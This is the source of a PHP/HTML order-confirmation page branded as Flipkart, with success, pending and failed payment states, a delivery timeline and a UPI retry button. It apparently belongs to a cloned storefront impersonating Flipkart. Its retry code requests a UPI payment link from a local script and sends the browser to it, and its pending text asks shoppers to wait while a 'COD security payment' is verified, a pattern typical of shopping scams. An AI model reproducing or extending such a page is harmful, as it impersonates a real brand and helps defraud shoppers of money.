<?php require_once __DIR__ . '/includes/bootstrap.php'; ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="assets/icons/app-icon.png">
    <link rel="apple-touch-icon" href="assets/icons/app-icon.png">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Order Confirmation – Flipkart</title>
    <meta name="description" content="Flipkart – order-confirmation page">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root {
  --blue: #2874f0;
  --orange: #fb641b;
  --green: #388e3c;
  --red: #d32f2f;
  --bg: #f1f3f6;
  --card: #fff;
  --border: #e0e0e0;
  --text: #212121;
  --muted: #878787;
  --radius: 10px;
}
* { box-sizing: border-box; margin: 0; padding: 0; }
body {
  font-family: 'Noto Sans', sans-serif;
  background: var(--bg);
  color: var(--text);
  font-size: 14px;
  min-height: 100vh;
}

/* HEADER */
header {
  background: var(--blue);
  height: 56px;
  display: flex; align-items: center;
  padding: 0 16px; gap: 12px;
  box-shadow: 0 2px 8px rgba(0,0,0,.15);
}
.h-logo { color: #fff; font-size: 20px; font-weight: 700; font-style: italic; }
.h-sub { color: rgba(255,255,255,.8); font-size: 12px; margin-left: 2px; }

/* ═══════════════════════════
   SUCCESS STATE
═══════════════════════════ */
.success-page { display: none; flex-direction: column; align-items: center; padding: 0 0 100px; }

/* Big success hero */
.success-hero {
  width: 100%;
  background: linear-gradient(160deg, #e8f5e9 0%, #f1fdf3 60%, #fff 100%);
  display: flex; flex-direction: column; align-items: center;
  padding: 36px 20px 30px;
  position: relative;
  overflow: hidden;
}
.success-hero::before {
  content: '';
  position: absolute; top: -60px; right: -60px;
  width: 200px; height: 200px;
  background: radial-gradient(circle, #c8e6c9 0%, transparent 70%);
  border-radius: 50%;
}
.checkmark-wrap {
  width: 90px; height: 90px;
  background: #fff;
  border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  box-shadow: 0 4px 20px rgba(56,142,60,.25);
  margin-bottom: 16px;
  animation: popIn .5s cubic-bezier(.175,.885,.32,1.275) both;
}
.checkmark-wrap svg { animation: drawCheck .4s .4s ease both; }
@keyframes popIn {
  from { transform: scale(0); opacity: 0; }
  to { transform: scale(1); opacity: 1; }
}
@keyframes drawCheck {
  from { stroke-dashoffset: 100; }
  to { stroke-dashoffset: 0; }
}
.success-title {
  font-size: 22px; font-weight: 700; color: var(--green);
  margin-bottom: 6px;
  animation: slideUp .4s .3s ease both;
}
.success-sub {
  font-size: 13.5px; color: #555; text-align: center; line-height: 1.6;
  animation: slideUp .4s .4s ease both;
}
.order-id-badge {
  margin-top: 14px;
  background: #fff;
  border: 1.5px solid #c8e6c9;
  border-radius: 8px;
  padding: 8px 18px;
  font-size: 12.5px;
  color: var(--green);
  font-weight: 600;
  letter-spacing: .03em;
  animation: slideUp .4s .5s ease both;
}

/* Confetti dots */
.confetti { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; }
.dot { position: absolute; border-radius: 50%; animation: fall linear infinite; }
@keyframes fall {
  0% { transform: translateY(-20px) rotate(0deg); opacity: 1; }
  100% { transform: translateY(250px) rotate(360deg); opacity: 0; }
}

/* ORDER PRODUCT CARD */
.order-product {
  background: var(--card);
  margin: 12px 12px 0;
  border-radius: var(--radius);
  border: 1px solid var(--border);
  padding: 14px;
  display: flex; gap: 12px;
  animation: fadeUp .4s .2s ease both;
  width: calc(100% - 24px);
}
.op-thumb {
  width: 72px; height: 72px;
  background: #f8f8f8; border: 1px solid #eee;
  border-radius: 8px; display: flex; align-items: center; justify-content: center;
  font-size: 32px; flex-shrink: 0; overflow: hidden;
}
.op-thumb img { width: 100%; height: 100%; object-fit: contain; padding: 4px; }
.op-info { flex: 1; min-width: 0; }
.op-brand { font-size: 11px; color: var(--muted); text-transform: uppercase; letter-spacing: .05em; }
.op-name { font-size: 13.5px; font-weight: 600; margin: 3px 0 6px; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden; }
.op-price { font-size: 15px; font-weight: 700; }

/* DELIVERY TIMELINE */
.delivery-card {
  background: var(--card);
  margin: 10px 12px 0;
  border-radius: var(--radius);
  border: 1px solid var(--border);
  padding: 16px;
  animation: fadeUp .4s .3s ease both;
  width: calc(100% - 24px);
}
.del-title { font-size: 13px; font-weight: 700; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; margin-bottom: 16px; }
.timeline { position: relative; padding-left: 20px; }
.timeline::before { content: ''; position: absolute; left: 7px; top: 8px; bottom: 8px; width: 2px; background: #e0e0e0; }
.tl-step { display: flex; align-items: flex-start; gap: 12px; margin-bottom: 18px; position: relative; }
.tl-step:last-child { margin-bottom: 0; }
.tl-dot {
  width: 16px; height: 16px; border-radius: 50%;
  border: 2px solid #e0e0e0; background: #fff;
  flex-shrink: 0; position: absolute; left: -20px; top: 2px;
  display: flex; align-items: center; justify-content: center;
}
.tl-dot.done { background: var(--green); border-color: var(--green); }
.tl-dot.done::after { content: '✓'; color: #fff; font-size: 8px; font-weight: 900; }
.tl-dot.active { background: var(--blue); border-color: var(--blue); animation: pulse 1.5s infinite; }
.tl-dot.active::after { content: ''; width: 6px; height: 6px; background: #fff; border-radius: 50%; }
@keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(40,116,240,.4); } 50% { box-shadow: 0 0 0 6px rgba(40,116,240,0); } }
.tl-label { font-size: 13px; font-weight: 600; color: var(--text); }
.tl-sub { font-size: 12px; color: var(--muted); margin-top: 2px; }
.tl-step.inactive .tl-label { color: var(--muted); font-weight: 400; }

/* ACTION BUTTONS */
.action-btns {
  display: flex; gap: 10px;
  margin: 12px 12px 0;
  animation: fadeUp .4s .4s ease both;
  width: calc(100% - 24px);
}
.action-btn {
  flex: 1; padding: 13px 10px;
  border-radius: var(--radius);
  font-size: 13px; font-weight: 700;
  cursor: pointer; font-family: inherit;
  transition: .2s; text-align: center; border: none;
}
.btn-primary { background: var(--blue); color: #fff; box-shadow: 0 3px 8px rgba(40,116,240,.3); }
.btn-primary:hover { background: #1a5fd0; }
.btn-outline { background: #fff; color: var(--blue); border: 2px solid var(--blue); }
.btn-outline:hover { background: var(--blue); color: #fff; }

/* ═══════════════════════════
   FAILED STATE
═══════════════════════════ */
.failed-page { display: none; flex-direction: column; align-items: center; padding: 0 0 100px; }

.failed-hero {
  width: 100%;
  background: linear-gradient(160deg, #ffebee 0%, #fff5f5 60%, #fff 100%);
  display: flex; flex-direction: column; align-items: center;
  padding: 36px 20px 30px;
  position: relative;
}
.failed-hero::before {
  content: '';
  position: absolute; top: -60px; right: -60px;
  width: 200px; height: 200px;
  background: radial-gradient(circle, #ffcdd2 0%, transparent 70%);
  border-radius: 50%;
}
.xmark-wrap {
  width: 90px; height: 90px;
  background: #fff; border-radius: 50%;
  display: flex; align-items: center; justify-content: center;
  box-shadow: 0 4px 20px rgba(211,47,47,.2);
  margin-bottom: 16px;
  animation: popIn .5s cubic-bezier(.175,.885,.32,1.275) both;
}
.failed-title { font-size: 22px; font-weight: 700; color: var(--red); margin-bottom: 6px; animation: slideUp .4s .3s ease both; }
.failed-sub { font-size: 13.5px; color: #555; text-align: center; line-height: 1.6; animation: slideUp .4s .4s ease both; }
.failed-amount {
  margin-top: 14px;
  background: #fff;
  border: 1.5px solid #ffcdd2;
  border-radius: 8px; padding: 8px 18px;
  font-size: 13px; color: var(--red); font-weight: 600;
  animation: slideUp .4s .5s ease both;
}

/* FAILURE REASON */
.fail-reason-card {
  background: var(--card);
  margin: 12px 12px 0;
  border-radius: var(--radius);
  border: 1px solid #ffcdd2;
  padding: 16px;
  width: calc(100% - 24px);
  animation: fadeUp .4s .2s ease both;
}
.fail-reason-card .fr-title { font-size: 13px; font-weight: 700; color: var(--red); margin-bottom: 12px; }
.fail-reason { display: flex; align-items: flex-start; gap: 10px; margin-bottom: 10px; }
.fail-reason:last-child { margin-bottom: 0; }
.fr-ico { font-size: 18px; flex-shrink: 0; }
.fr-text b { font-size: 13px; color: var(--text); display: block; }
.fr-text span { font-size: 12px; color: var(--muted); }

/* RETRY BTNS */
.retry-btns {
  display: flex; flex-direction: column; gap: 10px;
  margin: 12px 12px 0;
  width: calc(100% - 24px);
  animation: fadeUp .4s .35s ease both;
}
.retry-btn-full {
  width: 100%; padding: 14px;
  border-radius: var(--radius);
  font-size: 15px; font-weight: 700;
  cursor: pointer; font-family: inherit; border: none;
  transition: .2s;
}
.retry-primary { background: linear-gradient(135deg,#ff9800,#fb641b); color: #fff; box-shadow: 0 3px 8px rgba(251,100,27,.3); }
.retry-primary:hover { transform: translateY(-1px); }
.retry-secondary { background: #fff; color: var(--blue); border: 2px solid var(--blue); }
.retry-secondary:hover { background: var(--blue); color: #fff; }

/* SHARED */
@keyframes slideUp {
  from { opacity: 0; transform: translateY(16px); }
  to { opacity: 1; transform: translateY(0); }
}
@keyframes fadeUp {
  from { opacity: 0; transform: translateY(12px); }
  to { opacity: 1; transform: translateY(0); }
}

/* FOOTER BTN (success) */
.continue-footer {
  position: fixed; bottom: 0; width: 100%;
  padding: 12px 16px;
  background: #fff;
  border-top: 1px solid var(--border);
  box-shadow: 0 -2px 8px rgba(0,0,0,.07);
  z-index: 100;
}
.continue-footer button {
  width: 100%; padding: 14px;
  background: var(--blue); color: #fff;
  border: none; border-radius: var(--radius);
  font-size: 15px; font-weight: 700;
  cursor: pointer; font-family: inherit;
  transition: .2s;
}
.continue-footer button:hover { background: #1a5fd0; }

/* ══ MOBILE RESPONSIVE FIX ══ */
html, body {
    max-width: 100% !important;
    overflow-x: hidden !important;
    width: 100% !important;
}
*, *::before, *::after {
    box-sizing: border-box !important;
    max-width: 100% !important;
}
img, video, iframe, table {
    max-width: 100% !important;
    height: auto;
}
input, select, textarea, button {
    max-width: 100% !important;
}
</style>
    <link rel="stylesheet" href="assets/shared.css?v=20260320">
</head>
<body data-fk-sync="auth,orders">

<header>
  <span class="h-logo">Flipkart</span>
  <span class="h-sub">✦ Plus</span>
</header>

<!-- ══════════════════════════════════ -->
<!--         SUCCESS PAGE              -->
<!-- ══════════════════════════════════ -->
<div class="success-page" id="successPage">

  <div class="success-hero">
    <!-- Confetti -->
    <div class="confetti" id="confetti"></div>

    <div class="checkmark-wrap">
      <svg width="44" height="44" viewBox="0 0 52 52">
        <circle cx="26" cy="26" r="24" fill="none" stroke="#388e3c" stroke-width="3"/>
        <polyline
          points="14,27 22,35 38,17"
          fill="none" stroke="#388e3c" stroke-width="4"
          stroke-linecap="round" stroke-linejoin="round"
          stroke-dasharray="100" stroke-dashoffset="0"
        />
      </svg>
    </div>
    <div class="success-title">Order Placed! <svg viewBox="0 0 24 24" width="22" height="22" fill="#ffe57f" style="vertical-align:-4px"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm4.24 16L12 15.45 7.77 18l1.12-4.81-3.73-3.23 4.92-.42L12 5l1.92 4.53 4.92.42-3.73 3.23L16.23 18z"/></svg></div>
    <div class="success-sub">Your payment was successful.<br>Your order is confirmed and being processed.</div>
    <div class="order-id-badge" id="orderIdBadge">Order ID: #FK00000000</div>
  </div>

  <!-- PRODUCT -->
  <div class="order-product" id="successProduct">
    <div class="op-thumb" id="successThumb"><svg viewBox="0 0 24 24" width="40" height="40" fill="#2874f0"><path d="M18 6h-2c0-2.21-1.79-4-4-4S8 3.79 8 6H6c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-6-2c1.1 0 2 .9 2 2h-4c0-1.1.9-2 2-2zm6 16H6V8h2v2c0 .55.45 1 1 1s1-.45 1-1V8h4v2c0 .55.45 1 1 1s1-.45 1-1V8h2v12z"/></svg></div>
    <div class="op-info">
      <div class="op-brand" id="successBrand">Brand</div>
      <div class="op-name" id="successName">Product Name</div>
      <div class="op-price" id="successPrice">₹0</div>
    </div>
  </div>

  <!-- DELIVERY TIMELINE -->
  <div class="delivery-card">
    <div class="del-title">Delivery Status</div>
    <div class="timeline">
      <div class="tl-step">
        <div class="tl-dot done"></div>
        <div>
          <div class="tl-label">Order Confirmed <svg viewBox="0 0 24 24" width="12" height="12" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
          <div class="tl-sub" id="confirmedTime">Just now</div>
        </div>
      </div>
      <div class="tl-step">
        <div class="tl-dot active"></div>
        <div>
          <div class="tl-label">Packed &amp; Shipped</div>
          <div class="tl-sub" id="shippedTime">Expected by tomorrow</div>
        </div>
      </div>
      <div class="tl-step inactive">
        <div class="tl-dot"></div>
        <div>
          <div class="tl-label">Out for Delivery</div>
          <div class="tl-sub" id="outTime">–</div>
        </div>
      </div>
      <div class="tl-step inactive">
        <div class="tl-dot"></div>
        <div>
          <div class="tl-label">Delivered</div>
          <div class="tl-sub" id="deliveredTime">–</div>
        </div>
      </div>
    </div>
  </div>

  <!-- ACTIONS -->
  <div class="action-btns">
    <button class="action-btn btn-primary" onclick="window.location.href='index.php'">Continue Shopping</button>
    <button class="action-btn btn-outline" onclick="window.location.href='orders.php'">Track Order</button>
  </div>

  <div class="continue-footer">
    <button onclick="clearCartAndGo()"><svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor" style="vertical-align:-3px;margin-right:4px"><path d="M18 6h-2c0-2.21-1.79-4-4-4S8 3.79 8 6H6c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-6-2c1.1 0 2 .9 2 2h-4c0-1.1.9-2 2-2zm6 16H6V8h2v2c0 .55.45 1 1 1s1-.45 1-1V8h4v2c0 .55.45 1 1 1s1-.45 1-1V8h2v12z"/></svg> Go to Home</button>
  </div>

</div>

<!-- ══════════════════════════════════ -->
<!--         FAILED PAGE               -->
<!-- ══════════════════════════════════ -->
<div class="failed-page" id="failedPage">

  <div class="failed-hero">
    <div class="xmark-wrap">
      <svg width="44" height="44" viewBox="0 0 52 52">
        <circle cx="26" cy="26" r="24" fill="none" stroke="#d32f2f" stroke-width="3"/>
        <line x1="16" y1="16" x2="36" y2="36" stroke="#d32f2f" stroke-width="4" stroke-linecap="round"/>
        <line x1="36" y1="16" x2="16" y2="36" stroke="#d32f2f" stroke-width="4" stroke-linecap="round"/>
      </svg>
    </div>
    <div class="failed-title" style="color:#d32f2f">Payment Failed</div>
    <div class="failed-sub" id="failedSubText">Your payment could not be processed.<br>No amount has been deducted.</div>
    <div class="failed-amount" id="failedAmountBadge">Amount: ₹0 — Not Charged</div>
  </div>

  <!-- REASON CARD -->
  <div class="fail-reason-card">
    <div class="fr-title"><svg viewBox="0 0 24 24" width="16" height="16" fill="#ff9800" style="vertical-align:-3px;margin-right:5px"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg> What may have gone wrong</div>
    <div class="fail-reason">
      <span class="fr-ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg></span>
      <div class="fr-text">
        <b>UPI App not opened</b>
        <span>The payment app didn't respond in time</span>
      </div>
    </div>
    <div class="fail-reason">
      <span class="fr-ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M16.5 6.5L15 5l-5.5 5.5-2-2L6 10l2 2-4 4 1.5 1.5 4-4 2 2 1.5-1.5-2-2zm3.17-2.83l-1.41-1.41-2.83 2.83 1.41 1.41zM4.33 19.67l1.41 1.41 2.83-2.83-1.41-1.41z"/></svg></span>
      <div class="fr-text">
        <b>Network interruption</b>
        <span>Check your internet connection and try again</span>
      </div>
    </div>
    <div class="fail-reason">
      <span class="fr-ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z"/></svg></span>
      <div class="fr-text">
        <b>Insufficient balance</b>
        <span>Make sure you have enough funds in your account</span>
      </div>
    </div>
    <div class="fail-reason">
      <span class="fr-ico"><svg viewBox="0 0 24 24" width="20" height="20" fill="currentColor"><path d="M15 1H9v2h6V1zm-4 13h2V8h-2v6zm8.03-6.61l1.42-1.42c-.43-.51-.9-.99-1.41-1.41l-1.42 1.42A8.963 8.963 0 0 0 12 4c-4.97 0-9 4.03-9 9s4.02 9 9 9 9-4.03 9-9c0-2.12-.74-4.07-1.97-5.61zM12 20c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg></span>
      <div class="fr-text">
        <b>Transaction timed out</b>
        <span>Session expired — please try a fresh payment</span>
      </div>
    </div>
  </div>

  <!-- RETRY BUTTONS -->
  <div class="retry-btns">
    <button class="retry-btn-full retry-primary" onclick="retryPayment()">
      <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor" style="vertical-align:-4px;margin-right:6px"><path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>&nbsp;Retry Payment
    </button>
    <button class="retry-btn-full retry-secondary" onclick="window.location.href='payment.php'">
      <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor" style="vertical-align:-4px;margin-right:6px"><path d="M20 4H4c-1.11 0-2 .89-2 2v12c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>&nbsp;Try Different Payment Method
    </button>
    <button class="retry-btn-full retry-secondary" style="border-color:#e0e0e0; color:#555;" onclick="window.location.href='index.php'">
      <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor" style="vertical-align:-4px;margin-right:6px"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>&nbsp;Go to Home
    </button>
  </div>

</div>

<!-- TOAST -->
<div style="
  position:fixed; bottom:90px; left:50%;
  transform:translateX(-50%);
  background:#323232; color:white;
  padding:10px 20px; border-radius:24px;
  font-size:13px; z-index:9999;
  opacity:0; transition:opacity .3s;
  pointer-events:none; white-space:nowrap;
  font-family:'Noto Sans',sans-serif;
" id="toast"></div>

<script>
// ══════════════════════════════════════════════
//  READ STATUS FROM URL ?status=success or ?status=failed
//  Also supports ?demo=success or ?demo=failed for testing
// ══════════════════════════════════════════════
const params    = new URLSearchParams(location.search);
const status    = params.get('status') || params.get('demo') || 'success';
const latestOrder = (window.FK && FK.getLatestOrder) ? FK.getLatestOrder() : null;

const payName   = (latestOrder && latestOrder.product && latestOrder.product.name) || localStorage.getItem('pay_name')  || 'Product';
const payBrand  = (latestOrder && latestOrder.product && latestOrder.product.brand) || localStorage.getItem('pay_brand') || '';
const payPrice  = (latestOrder && latestOrder.total) || parseFloat(localStorage.getItem('pay_price')) || 0;
const payMrp    = (latestOrder && latestOrder.pricing && latestOrder.pricing.mrp) || parseFloat(localStorage.getItem('pay_mrp')) || payPrice;
const payImg    = (latestOrder && latestOrder.product && latestOrder.product.img) || localStorage.getItem('pay_img')   || '';

// ── Generate Order ID ──
function genOrderId() {
  return params.get('order') || (latestOrder && latestOrder.id) || localStorage.getItem('last_order_id') || ('FK' + Date.now().toString().slice(-10));
}

// ── Date helpers ──
function today() {
  return new Date().toLocaleDateString('en-IN', { day:'numeric', month:'short', year:'numeric' });
}
function addDays(n) {
  const d = new Date();
  d.setDate(d.getDate() + n);
  return d.toLocaleDateString('en-IN', { weekday:'short', day:'numeric', month:'short' });
}

// ══════════════════════════════════════════════
//  SHOW SUCCESS
// ══════════════════════════════════════════════
function showSuccess() {
  document.getElementById('successPage').style.display = 'flex';

  // Order ID
  const orderId = genOrderId();
  document.getElementById('orderIdBadge').textContent = 'Order ID: #' + orderId;

  // Product info
  document.getElementById('successBrand').textContent = payBrand.toUpperCase();
  document.getElementById('successName').textContent  = payName;
  document.getElementById('successPrice').textContent = payPrice ? '₹' + payPrice.toLocaleString('en-IN') : '';

  if (payImg) {
    const holder = document.getElementById('successThumb');
    holder.innerHTML = '';
    const img = document.createElement('img');
    img.src = payImg;
    img.alt = payName;
    img.onerror = function(){ this.remove(); };
    holder.appendChild(img);
  }

  // Timeline dates
  const now = new Date();
  document.getElementById('confirmedTime').textContent = today() + ' — ' +
    now.toLocaleTimeString('en-IN', { hour:'2-digit', minute:'2-digit' });
  document.getElementById('shippedTime').textContent = addDays(1);
  document.getElementById('outTime').textContent     = addDays(2);
  document.getElementById('deliveredTime').textContent = addDays(3);

  // Clear cart on successful order
  if (window.FK && FK.clearCart) { FK.clearCart(); } else { localStorage.removeItem('flipkart_cart'); }

  // Confetti
  spawnConfetti();
}

// ══════════════════════════════════════════════
//  SHOW FAILED
// ══════════════════════════════════════════════
function showFailed() {
  document.getElementById('failedPage').style.display = 'flex';

  if (payPrice) {
    document.getElementById('failedAmountBadge').textContent =
      '₹' + payPrice.toLocaleString('en-IN') + ' — Not Charged';
  }

  const reason = params.get('reason');
  if (reason === 'timeout') {
    document.getElementById('failedSubText').textContent =
      'Your session expired before the payment was completed.\nNo amount has been deducted.';
  } else if (reason === 'declined') {
    document.getElementById('failedSubText').textContent =
      'Your bank declined this transaction.\nPlease try a different payment method.';
  }
}

// ══════════════════════════════════════════════
//  CONFETTI
// ══════════════════════════════════════════════
function spawnConfetti() {
  const container = document.getElementById('confetti');
  const colors = ['#2874f0','#fb641b','#388e3c','#ff9800','#e91e63','#9c27b0'];
  for (let i = 0; i < 28; i++) {
    const d = document.createElement('div');
    d.className = 'dot';
    const size = Math.random() * 8 + 5;
    d.style.cssText = `
      width:${size}px; height:${size}px;
      background:${colors[Math.floor(Math.random()*colors.length)]};
      left:${Math.random()*100}%;
      top:-10px;
      animation-duration:${1.5 + Math.random()*2}s;
      animation-delay:${Math.random()*1.5}s;
      opacity:${0.6 + Math.random()*.4};
    `;
    container.appendChild(d);
  }
}

// ══════════════════════════════════════════════
//  RETRY
// ══════════════════════════════════════════════
async function retryPayment() {
  if (!payPrice) { window.location.href = 'payment.php'; return; }
  try {
    const r = await fetch('assets/upi_link.php', {
      method: 'POST', credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ amount: payPrice, note: 'Flipkart' })
    });
    const d = await r.json();
    if (d.ok && d.link) {
      showToast('Opening payment app...');
      setTimeout(() => { window.location.href = d.link; }, 400);
    } else { window.location.href = 'payment.php'; }
  } catch(e) { window.location.href = 'payment.php'; }
}

function clearCartAndGo() {
  window.location.href = 'index.php';
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.style.opacity = '1';
  setTimeout(() => { t.style.opacity = '0'; }, 2500);
}

// ══════════════════════════════════════════════
//  INIT — show correct state
// ══════════════════════════════════════════════
function initConfirmation() {
  if (status === 'failed' || status === 'fail') {
    showFailed();
  } else if (status === 'payment_pending' || status === 'cod_pending') {
    // Show success UI but with pending messaging
    showSuccess();
    // Update text to reflect pending verification
    const subEl = document.querySelector('.success-sub');
    if (subEl) {
      if (status === 'cod_pending') {
        subEl.innerHTML = 'Your COD security payment is being verified.<br>Your order will be confirmed shortly.';
      } else {
        subEl.innerHTML = 'Your payment is being verified.<br>Your order will be confirmed once payment is confirmed.';
      }
    }
    // Change the checkmark color to orange/pending
    const circle = document.querySelector('.checkmark-wrap circle');
    const poly = document.querySelector('.checkmark-wrap polyline');
    if (circle) circle.setAttribute('stroke', '#ff9800');
    if (poly) poly.setAttribute('stroke', '#ff9800');
    const title = document.querySelector('.success-title');
    if (title) { title.style.color = '#e65100'; title.textContent = 'Order Placed! ⏳'; }
  } else {
    showSuccess();
  }
}
initConfirmation();
document.addEventListener('fk:orders-sync', function(){
  if (!params.get('order')) return;
  const synced = (window.FK && FK.getLatestOrder) ? FK.getLatestOrder() : null;
  if (synced && synced.id) {
    document.getElementById('orderIdBadge').textContent = 'Order ID: #' + synced.id;
  }
});
</script>
<script>
</script>
    <script src="assets/shield.js" defer></script>
    <script src="assets/shared.js?v=20260320" defer></script>
</body>
</html>
